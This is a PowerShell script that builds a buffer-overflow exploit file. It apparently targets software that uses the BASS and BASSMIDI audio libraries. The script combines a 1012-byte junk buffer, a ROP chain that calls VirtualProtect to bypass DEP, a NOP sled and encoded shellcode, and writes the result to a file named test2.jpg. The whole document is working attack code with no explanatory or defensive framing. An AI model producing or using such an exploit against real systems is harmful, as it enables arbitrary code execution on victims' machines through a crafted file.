      $rop_gadgest = 0x77, 0x5f, 0x01, 0x10,  # POP EAX # RETN [BASS.dll]
      0x5c, 0xe2, 0x60, 0x10,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
      0xf1, 0xea, 0x01, 0x10,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll]
      0x50, 0x09, 0x03, 0x10,  # XCHG EAX,ESI # RETN [BASS.dll]
      0x48, 0xd7, 0x01, 0x10,  # POP EBP # RETN [BASS.dll]
      0xc5, 0x22, 0x02, 0x10,  # & jmp esp [BASS.dll]
      0xe7, 0x5f, 0x01, 0x10,  # POP EAX # RETN [BASS.dll]
      0xff, 0xfd, 0xff, 0xff,  # Value to negate, will become 0x00000201
      0xb4, 0x4d, 0x01, 0x10,  # NEG EAX # RETN [BASS.dll]
      0x32, 0x2f, 0x03, 0x10,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll]
      0x77, 0x15, 0x01, 0x10,  # POP EAX # RETN [BASS.dll]
      0xc0, 0xff, 0xff, 0xff,  # Value to negate, will become 0x00000040
      0xb4, 0x4d, 0x01, 0x10,  # NEG EAX # RETN [BASS.dll]
      0x6d, 0x8a, 0x03, 0x10,  # XCHG EAX,EDX # RETN [BASS.dll]
      0xc7, 0x63, 0x01, 0x10,  # POP ECX # RETN [BASS.dll]
      0x06, 0xda, 0x60, 0x10,  # &Writable location [BASSMIDI.dll]
      0x58, 0x36, 0x60, 0x10,  # POP EDI # RETN [BASSMIDI.dll]
      0x05, 0xdc, 0x01, 0x10,  # RETN (ROP NOP) [BASS.dll]
      0xe7, 0x5f, 0x01, 0x10,  # POP EAX # RETN [BASS.dll]
      0x90, 0x90, 0x90, 0x90,  # nop
      0xa5, 0xd7, 0x01, 0x10;  # PUSHAD # RETN [BASS.dll]

[Byte[]] $buf = 0xd9, 0xea, 0xba, 0x33, 0x44, 0x3b, 0x11, 0xd9, 0x74, 0x24, 0xf4, 0x5d, 0x33,
 0xc9, 0xb1, 0x31, 0x83, 0xc5, 0x04, 0x31, 0x55, 0x14, 0x03, 0x55, 0x27, 0xa6,
 0xce, 0xed, 0xaf, 0xa4, 0x31, 0x0e, 0x2f, 0xc9, 0xb8, 0xeb, 0x1e, 0xc9, 0xdf,
 0x78, 0x30, 0xf9, 0x94, 0x2d, 0xbc, 0x72, 0xf8, 0xc5, 0x37, 0xf6, 0xd5, 0xea,
 0xf0, 0xbd, 0x03, 0xc4, 0x01, 0xed, 0x70, 0x47, 0x81, 0xec, 0xa4, 0xa7, 0xb8,
 0x3e, 0xb9, 0xa6, 0xfd, 0x23, 0x30, 0xfa, 0x56, 0x2f, 0xe7, 0xeb, 0xd3, 0x65,
 0x34, 0x87, 0xaf, 0x68, 0x3c, 0x74, 0x67, 0x8a, 0x6d, 0x2b, 0xfc, 0xd5, 0xad,
 0xcd, 0xd1, 0x6d, 0xe4, 0xd5, 0x36, 0x4b, 0xbe, 0x6e, 0x8c, 0x27, 0x41, 0xa7,
 0xdd, 0xc8, 0xee, 0x86, 0xd2, 0x3a, 0xee, 0xcf, 0xd4, 0xa4, 0x85, 0x39, 0x27,
 0x58, 0x9e, 0xfd, 0x5a, 0x86, 0x2b, 0xe6, 0xfc, 0x4d, 0x8b, 0xc2, 0xfd, 0x82,
 0x4a, 0x80, 0xf1, 0x6f, 0x18, 0xce, 0x15, 0x71, 0xcd, 0x64, 0x21, 0xfa, 0xf0,
 0xaa, 0xa0, 0xb8, 0xd6, 0x6e, 0xe9, 0x1b, 0x76, 0x36, 0x57, 0xcd, 0x87, 0x28,
 0x38, 0xb2, 0x2d, 0x22, 0xd4, 0xa7, 0x5f, 0x69, 0xb2, 0x36, 0xed, 0x17, 0xf0,
 0x39, 0xed, 0x17, 0xa4, 0x51, 0xdc, 0x9c, 0x2b, 0x25, 0xe1, 0x76, 0x08, 0xd9,
 0xab, 0xdb, 0x38, 0x72, 0x72, 0x8e, 0x79, 0x1f, 0x85, 0x64, 0xbd, 0x26, 0x06,
 0x8d, 0x3d, 0xdd, 0x16, 0xe4, 0x38, 0x99, 0x90, 0x14, 0x30, 0xb2, 0x74, 0x1b,
 0xe7, 0xb3, 0x5c, 0x78, 0x66, 0x20, 0x3c, 0x51, 0x0d, 0xc0, 0xa7, 0xad;

$junk = [System.Text.Encoding]::ASCII.GetBytes("A"*1012);
$rop_gadgest;

[Byte[]]$nop = 0x90;
for ($I = 0; $I -lt 89; $I++){
    $nop += 0x90;
}

[Byte[]]$payload = 0;
$payload += $junk;
$payload += $rop_gadgest;
$payload += $nop;
$payload += $buf;

[io.file]::WriteAllBytes($PWD.Path + '\test2.jpg',$payload);